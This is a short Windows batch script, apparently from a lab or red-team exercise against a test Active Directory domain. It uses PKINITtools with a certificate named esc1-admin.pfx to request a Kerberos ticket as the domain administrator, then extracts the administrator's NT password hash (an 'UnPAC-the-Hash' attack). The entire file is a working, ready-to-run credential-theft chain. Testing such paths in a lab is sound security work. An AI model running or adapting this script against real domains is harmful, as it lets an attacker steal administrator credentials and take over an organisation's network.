@echo off
REM Branch B WT053 UnPAC-the-Hash via PKINITtools (T008-proven path) on esc1-admin.pfx
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set PK=C:\Tools\cadre-attack\pkinittools-src\PKINITtools-master
set PYTHONIOENCODING=utf-8

echo === gettgtpkinit with esc1-admin.pfx ===
set KRB5CCNAME=C:\Tools\cadre-attack\esc1-admin.ccache
python %PK%\gettgtpkinit.py -cert-pfx esc1-admin.pfx -dc-ip 192.168.77.10 "cadre.local/administrator" esc1-admin.ccache 2>&1
echo TGT_RC %ERRORLEVEL%
dir esc1-admin.ccache 2>&1

echo === getnthash from TGT ===
python %PK%\getnthash.py -dc-ip 192.168.77.10 "cadre.local/administrator" 2>&1
echo NTHASH_RC %ERRORLEVEL%
